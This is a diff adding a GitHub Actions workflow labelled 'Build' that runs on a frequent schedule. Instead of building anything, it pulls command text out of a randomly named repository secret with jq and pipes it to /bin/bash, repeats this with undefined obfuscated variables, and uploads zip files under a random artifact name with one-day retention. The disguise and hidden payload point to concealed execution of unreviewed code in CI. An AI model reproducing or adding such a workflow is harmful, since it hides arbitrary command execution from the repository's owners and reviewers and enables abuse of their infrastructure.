@@ -1,0 +1,36 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          giwya5657: ${{ secrets.giwya5657 }}
+        run: |
+          printf '%s' "$giwya5657" | jq -r .su830 | /bin/bash
+          echo $ehbyq855 | jq -r .a2 | /bin/bash
+          printf '%s' "$frmq501" | jq -r .sjawf43 | /bin/bash
+          echo $tcj0 | jq -r .sjbtf91814 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: kIeL0U9C
+          path: "*.zip"
+          retention-days: 1
